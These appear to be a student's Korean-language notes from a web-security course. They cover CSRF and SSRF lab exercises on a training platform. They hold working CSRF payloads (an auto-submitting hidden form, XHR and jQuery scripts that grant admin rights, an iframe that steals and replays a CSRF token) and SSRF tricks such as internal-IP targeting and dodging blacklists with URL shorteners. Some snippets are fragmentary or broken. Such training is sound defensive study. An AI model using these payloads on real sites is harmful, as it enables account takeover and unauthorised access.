</form>
<form id="testform" action="/bbs11/updatePostAuth" method="POST">
    <input name="loginId" class="attackinput" value="pppp@pppp.com" />
    <input name="adminYn" class="attackinput" value="2" />
</form>
<script>document.getElementById('testform').submit();</script>
<form>

* 게시글 작성 -> 악성코드
화면은 그대로 남아있어야 함

1. <iframe src="악성링크" style="display:none; width:0px;height:0px;"> 요기안에서 저거를 실행해주는 링크</iframe>

2. javascript로 전송
AJAX -> 

javascript
var form = document.getElementById('attackForm')
form.submit()
var input1 = document.getElementsByName('loginId')
var input2 = document.getElementsByClassName('attackinput')[]

lib jquery $ <-

var form = $('#attackForm')
form.submit();
var input1 = $("[name=tableName]");
var input2 = $('.attackinput')



var xhr = new XMLHttpRequest();
var formData = new FormData();
formData.append("loginId","pppp@pppp.com");
formData.append("adminYn","2");
xhr.open("POST", "https://elms1.skinfosec.co.kr:8082/bbs11/updatePostAuth");
xhr.send(formData);

<script>var xhr = new XMLHttpRequest();var formData = new FormData();formData.append("loginId","pppp@pppp.com");formData.append("adminYn","2");xhr.open("POST", "https://elms1.skinfosec.co.kr:8082/bbs11/updatePostAuth");xhr.send(formData);</script>


* CSRF 문제 2번

JQuery를 이용해서 AJAX로
화면 이동 없이 게시물 조회 상태 그대로
관리자가 눈치 못채도록 공격 구문 만들어서
CSRF 공격 해보세요.

- 공격 구문 :
 $.ajax ......................

DM 보내주세요.

- Hint : Post일 때는 파라미터 전송 시 Content-Type 을 고려


* CSRF 문제 4번

일반사용자로 글 쓰고나서 일반사용자 -> 로그 아웃!!!!
하고 나서 관리자 들어가서 해당 글 읽어서 공격 성공 확인


<script>var method = 'POST';var url = '/bbs11/updatePostAuth';var json = {    'loginId':'pppp@pppp.com',    'adminYn':'2'};var data = JSON.stringfy(json);var content = "application/x-www-form-urlencoded; charset=UTF-8";$.ajax({type:method,url:url,data:data,contentType:content});</script>

1. 추가인증
  2차인증, captcha
2. CSRF Token


1차 토큰 : YGoUyYoRz36RhCvfiezK
2차 토큰 : Q5INkDQDOK0SiNITtfAc


https://elms1.skinfosec.co.kr:8082/bbs11/updateTokenAuth?csrf_token=[탈취한 토큰]&loginId=pppp%40pppp.com&adminYn=2

<input name="csrf_token" type="hidden" value="LyNEv9MwgfcpRWnef9iq">

https://elms1.skinfosec.co.kr:8082/community15/authpage
var token = document.getElementsByName('csrf_token')[0].value;


var url = "https://elms1.skinfosec.co.kr:8082/bbs11/updateTokenAuth?csrf_token=" + token  +"&loginId=pppp%40pppp.com&adminYn=2


<iframe id src="https://elms1.skinfosec.co.kr:8082/community15/authpage"></iframe>
<script>
    var attackframe = 
    var token = document.getElementsByName('csrf_token')[0].value;
    var url = "https://elms1.skinfosec.co.kr:8082/bbs11/updateTokenAuth?csrf_token=" + token  +"&loginId=pppp%40pppp.com&adminYn=2";$.ajax({type:'get',url:url});
</script>

iframe.contentWindow.document.get

window.document.get


* XSS vs CSRF       ||     vs SSRF 
클라이언트 vs 서버 vs 서버
(브라우저 실행)  (서버에게 실행)


* Server-side Request Forgery

서버가 다른 곳에 요청을 보내는 기능이 있을 때
정상적인 다른 곳이 아니라 내부를 향하게 하는 공격입니다.


papago.com/trans?url=https://www.yahoo.jp/keyword=라멘

브라우저   ->    번역서비스서버   -> yahoo.jp
결과응답   <-         번역       <- 

브라우저 -> yahoo.jp -> 번역



자기자신
내부IP

papago.com/trans?url=https://127.0.0.1:8080/
                     https://192.168.0.20/


 인터넷 외부IP
     |
     공유기
     |---------------                 
    제꺼와이파이   다른와이파이  다른분와이파이
    192.168.0.10       0.20           0.30


http://normalskinfosec.com:8080/include/db_conf.php

사용자 입력값 검증 <- bit.ly/sadikflj
localhost
192.168.
127.0.
10.0.
blacklist

-> 피싱 -> bit.ly/alefkj  goo.gl/ewqfoj shor.ten/dalfj
URL Shortening
https://192.168.0.10/include/dbconfg.php -> bit.ly/sadikflj

http://normalskinfosec2.com:8080/include/db_conf.php



* 문제 3번 SSRF
1. 관리자페이지 로그인 성공한 URL : 주소창 복사
   보내주실 때 전체 URL 보내주세요.
2. 정답

Hint 1 : 소스보기 하면 정보가 다 있습니다.
Hint 2 : 로그인이 안될 때 주소창의 주소를 확인해보세요.

- 필요 정보 탈취
1) 관리자 페이지에 접근 하기 위한 정보
2) 관리자의 아이디와 비밀번호

* 문제 2번 SSRF
-> php 소스코드를 확인하는 문제입니다.
1. 문제 풀이한 과정!!!
  1) 뭐했다
  2) 뭐했다
  순서대로
2. 정답
- Hint 1 : 사진뷰어니까 img Tag 봐야 합니다. + Base64, 뒷부분 디코딩해서 원래의 데이터 확인
- Hint 2 : 해당 주소에 Request 보내는게 X
           해당 위치에 있는 자원을 Read
- Hint 3 : http://................. X    
          현재 서버가 실행중인 위치 
            pwd -> /var/www/html/exam13/board/
- Hint 4 : include , include_once , ... 000.php

<? php
  if ....
?>




관리자 페이지
http://normalskinfosec3.com:8098/admin.php

https://elms2.skinfosec.co.kr:8097/ssrf_3/admin.php?login_id=adminID&login_pwd=adminPW

https://elms2.skinfosec.co.kr:8098/ssrf_3/admin.php
